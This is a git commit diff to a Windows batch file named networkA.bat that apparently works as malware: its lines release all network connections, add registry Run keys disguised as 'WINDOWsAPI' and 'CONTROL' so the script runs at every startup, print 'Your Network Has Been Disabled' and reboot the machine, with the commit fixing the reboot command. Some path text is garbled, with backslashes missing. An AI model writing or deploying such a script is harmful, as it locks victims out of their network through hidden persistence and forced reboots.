8214b9fead99c5f6ed34442f68eddf0340dd3367
Zinffo <69107189+Zinffo@users.noreply.github.com>
2021-04-16 18:45:13 +0200

    Update networkA.bat

--- junkins/startup/networkA.bat
+++ junkins/startup/networkA.bat
@@ -4,4 +4,4 @@ ipconfig/release_all>c:networkA.bat
 echo end>c:networkA.bat reg add
 hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:networkA.bat /f reg add
 hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROL exit /t reg_sz /d c:networkA.bat /f echo Your Network Has Been Disabled 
-vmic where os primary=1 reboot
+wmic where os primary=1 reboot
